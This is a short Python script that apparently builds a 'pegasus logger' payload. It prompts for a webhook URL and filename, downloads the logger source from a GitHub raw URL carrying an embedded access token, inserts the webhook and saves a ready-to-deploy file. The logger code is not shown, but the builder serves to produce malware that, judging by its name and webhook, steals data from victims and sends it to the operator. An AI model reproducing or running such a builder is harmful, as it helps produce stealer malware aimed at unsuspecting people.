import requests
from colorama import Fore, Style

def main():
    print(Fore.BLUE + """
__________                                         
\______   \ ____   _________    ________ __  ______
 |     ___// __ \ / ___\__  \  /  ___/  |  \/  ___/
 |    |   \  ___// /_/  > __ \_\___ \|  |  /\___ \ 
 |____|    \___  >___  (____  /____  >____//____  >
               \/_____/     \/     \/           \/ 
               
            Builder for pegasus logger
           github.com/addi00000/pegasus""" + Style.RESET_ALL)
    
    webhook = str(input("Webhook URL: "))
    filename = str(input("Filename: "))
    
    raw = requests.get('https://raw.githubusercontent.com/addi00000/pegasus/main/pegasus.py?token=GHSAT0AAAAAABQE3SPPAZ3FNTZTA373EWHUYSJY2JQ').text
    
    with open(f"{filename}.py", "w", encoding="utf-8") as f:
        f.write(raw.replace("&WEBHOOK_URL&", webhook))
if __name__ == '__main__':
    main()
    